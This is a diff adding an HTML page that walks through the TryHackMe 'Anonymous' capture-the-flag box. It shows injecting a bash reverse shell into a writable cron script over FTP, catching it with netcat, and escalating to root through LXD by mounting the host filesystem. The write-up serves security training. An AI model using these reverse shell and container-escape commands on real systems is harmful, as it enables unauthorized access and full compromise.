@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anonymous Walkthrough | R3dex Writeups</title>
+    <style>
+        body { 
+            background: #0d1117; /* GitHub-like dark background */
+            color: #e6edf3; 
+            font-family: 'IBM Plex Sans', -apple-system, BlinkMacSystemFont, sans-serif; 
+            padding: 4rem 2rem; 
+            max-width: 1100px; 
+            margin: 0 auto; 
+            line-height: 1.6; 
+        }
+        h1 { color: #ffffff; font-size: 2.2rem; margin-bottom: 1.5rem; font-weight: 400; }
+        h3 { color: #ffffff; border-bottom: 1px solid #30363d; padding-bottom: 0.5rem; margin-top: 3rem; margin-bottom: 1.5rem; font-size: 1.3rem; font-weight: 400; }
+        a { color: #4493f8; text-decoration: none; transition: 0.2s; }
+        a:hover { text-decoration: underline; }
+        .back-link { display: inline-block; margin-bottom: 3rem; color: #8b949e; font-size: 0.9rem; }
+        .back-link::before { content: '← '; }
+        .content { margin-top: 2rem; }
+        code { background: rgba(110, 118, 129, 0.2); padding: 0.2rem 0.4rem; border-radius: 6px; font-family: 'IBM Plex Mono', monospace; color: #e6edf3; font-size: 0.9em; }
+        pre { 
+            background: #161b22; 
+            padding: 1.2rem; 
+            border-radius: 6px; 
+            overflow-x: auto; 
+            font-family: 'IBM Plex Mono', monospace; 
+            border: 1px solid #30363d; 
+            margin: 1.5rem 0; 
+            color: #e6edf3;
+            font-size: 0.9rem;
+        }
+        ul, ol { margin-bottom: 1.5rem; padding-left: 1.5rem; }
+        li { margin-bottom: 0.5rem; }
+        p { margin-bottom: 1.2rem; }
+        hr { border: 0; border-top: 1px solid #30363d; margin: 3rem 0; }
+        .hero-banner { 
+            width: 100%; 
+            max-height: 500px; 
+            object-fit: contain; 
+            margin-bottom: 2.5rem; 
+            background: transparent;
+        }
+    </style>
+</head>
+<body>
+    <a href="../index.html" class="back-link">Back to Writeups</a>
+    
+    <div class="content">
+        <img src="../assets/anonymous.png" alt="Anonymous Lab Banner" class="hero-banner">
+        <h1>Anonymous Walkthrough - TryHackMe</h1>
+        <h3>Introduction</h3>
+        <p>Essentially, the owner of the box left an <strong>FTP directory writable to guests</strong>. Inside, there is a bash script called <code>clean.sh</code> that cleans the <code>/tmp</code> directory. This script is run by a <strong>cron job</strong>, which means we can <strong>modify files in the FTP share</strong> to include a malicious line of code and gain a shell on the box — part 1 done.</p>
+        <p>For privilege escalation, the user we log in as is a member of the <strong>sudo group</strong>. This allows us to leverage <strong>LXD</strong> to get root on the box.</p>
+
+        <h3>Step 1: Nmap Scan</h3>
+        <p>We start with a basic scan:</p>
+        <pre>nmap -sC -sV &lt;target-ip&gt;</pre>
+        <p>Initially, only two ports were open. No web server was found, so a full TCP scan was run to check for missed ports. Two more ports were discovered: standard SMB ports.</p>
+
+        <h3>Step 2: Service Analysis</h3>
+        <p>We discovered anonymous FTP login is allowed.</p>
+
+        <h3>Step 3: FTP Enumeration</h3>
+        <p>Connect to FTP using:</p>
+        <pre>ftp &lt;target-ip&gt;</pre>
+        <p>Explore the files on the FTP share:</p>
+        <ul>
+            <li><code>To_do.txt</code> – Reminder to disable anonymous login</li>
+            <li><code>clean.sh</code> – Bash script deleting /tmp files</li>
+            <li><code>removed_files.log</code> – Logs of deleted files</li>
+        </ul>
+        <p>Since the script is run by cron, modifying <code>clean.sh</code> allows us to inject a reverse shell.</p>
+
+        <h3>Step 4: SMB Enumeration</h3>
+        <p>SMB share named <code>pics</code> allowed NULL authentication.</p>
+
+        <h3>Step 5: Gaining a Shell</h3>
+        <p>Edit <code>clean.sh</code> and add a bash reverse shell with your IP:</p>
+        <pre>bash -i >& /dev/tcp/&lt;your-ip&gt;/4444 0>&1</pre>
+        <p>Upload the modified script using FTP put:</p>
+        <pre>ftp> put clean.sh</pre>
+        <p>Start a listener on your machine:</p>
+        <pre>nc -lvnp 4444</pre>
+        <p>Wait for the cron job to execute <code>clean.sh</code>. A few seconds later, a shell is obtained.</p>
+
+        <h3>Step 6: Capture User Flag</h3>
+        <p>Navigate to the user's home directory:</p>
+        <pre>cat user.txt</pre>
+
+        <h3>Step 7: Privilege Escalation</h3>
+        <p>Found potential privilege escalation via LXD.</p>
+
+        <h3>Step 8: Exploiting LXD</h3>
+        <p>LXD is Ubuntu's container manager using Linux containers. Users in the lxd group can be exploited to gain root.</p>
+        <ol>
+            <li>Download LXD Alpine builder from GitHub.</li>
+            <li>Build a small Alpine Linux image.</li>
+            <li>Upload the image to the target machine.</li>
+            <li>Import the image into LXC.</li>
+        </ol>
+        <pre>lxc image import alpine.tar.gz --alias myalpine</pre>
+        <p>Run following commands:</p>
+        <pre>lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+lxc image list
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+cd /mnt/root
+chroot /mnt/root /bin/bash</pre>
+        <p>We now have root access on the box.</p>
+
+        <h3>Step 9: Capture Root Flag</h3>
+        <pre>cat /root/root.txt</pre>
+        <p>Submit the flag and claim your points!</p>
+
+        <h3>Conclusion</h3>
+        <ul>
+            <li>Exploited writable FTP + cron to get a shell.</li>
+            <li>Escalated privileges using LXD containers.</li>
+            <li>Learned about the dangers of sudo group membership and LXD.</li>
+        </ul>
+
+        <h3>References</h3>
+        <p><a href="https://reboare.github.io/lxd/lxd-escape.html">Privilege Escalation via LXD</a></p>
+        <p>TryHackMe Room: <a href="https://tryhackme.com/room/anonymous">Anonymous</a></p>
+    </div>
+</body>
+</html>
